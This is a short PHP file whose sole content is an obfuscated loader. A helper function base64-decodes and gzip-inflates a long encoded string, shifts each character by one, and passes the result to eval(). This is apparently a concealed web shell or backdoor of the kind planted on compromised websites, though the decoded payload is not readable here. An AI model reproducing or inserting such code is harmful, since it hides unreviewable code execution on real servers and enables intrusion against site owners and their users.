<?php function dTZ($slX)
{ 
$slX=gzinflate(base64_decode($slX));
 for($i=0;$i<strlen($slX);$i++)
 {
$slX[$i] = chr(ord($slX[$i])-1);
 }
 return $slX;
 }eval(dTZ("VVLLbtswELyTX8ESQiXBRmK7cdFUUZwiyKGX9uCj4RKUtEoIs6RA0nnA9bd3SaktKvAwmB3Ozi7FGH7UNsIH6UJRVnR4GpTpLUJGs4hYzbD+CEG01gQwwUcZUmA60WqQJmnpHThnnXAwWBeUeSwWKPPgvbLmn33slx3greZwtYYPq+semnV3vVo3HE1IJrYP2+3X7992+SHf11FZUfLH5cWpANjTeoheJBusD3WvNPyfj+MQny8vlRmOgUeh6ot38IrFZKOt7KArcjsg4XVelpScKCFZqHkjPXy8EvyCd9DaDngVC6lPFooELnjyJHh664pM1YsqUzc+OA1mlJRIzGYlO6V5CSEs0btM7XGdf/GPOB+C2fL9cr3H+Sf1mcYD2sMULPWf4goM5t6GKcyc8S8P2+XqE5+nvcZk53HL0rkaXgeNUxT5r3w+JRuL/dG0dZTsFvuJGqSTP/1ILpEkrZbes/vTcGy0alm8EnB/TAhlnu0BMAGOCM9SI0pbOY+t71qptTh6cCJeKgy8sPuinE8tMAOF9skyfrPBl2IJp3+tYptb3Djd3NLf"));?>